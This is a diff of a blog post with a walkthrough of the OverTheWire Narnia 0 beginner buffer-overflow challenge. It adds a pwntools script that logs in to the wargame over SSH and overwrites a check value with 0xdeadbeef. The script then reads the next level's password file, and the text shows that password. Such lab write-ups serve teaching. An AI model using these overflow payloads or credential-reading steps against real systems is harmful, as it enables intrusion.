@@ -8,8 +8,6 @@ comments: true
 
 This blogpost contains the solutions for Narnia series of challenges from overthewire, this category of challenges are aimed at beginners to binary exploitation.
 
-First step is ssh into overthewire.org with the provided credentials for narnia challenges.All Narnia binaries and source files are located in /narnia/. 
-
 Let's take a look at the code of this program.The below C code is the source code for the first challenge in the Narnia series of challenges from Overthewire.
 
 ## Narnia 0
@@ -78,6 +76,22 @@ whoami
 narnia1
 cat /etc/narnia_pass/narnia1
 efeidiedae
+```
+> Full exploit
+```python
+from pwn import *
+
+context(arch='i386', os='linux')
+context.log_level = 'debug'
+s = ssh(user='narnia0', host='narnia.labs.overthewire.org', port=2226, password='narnia0')
+sh = s.run('/narnia/narnia0')
+payload = ""
+payload = 'A'*20 + '\xef\xbe\xad\xde'
+s.sendline(payload)
+sh.recvline(s)
+s.sendline('cat /etc/narnia_pass/narnia1')
+sh.recvline(sh)
+
 ```
 ### Conclusion 
 Running the above command give us a shell as narnia1, now we can cat the flag. This is a very simple buffer overflow example, i will doing next challenge Narnia1 soon.
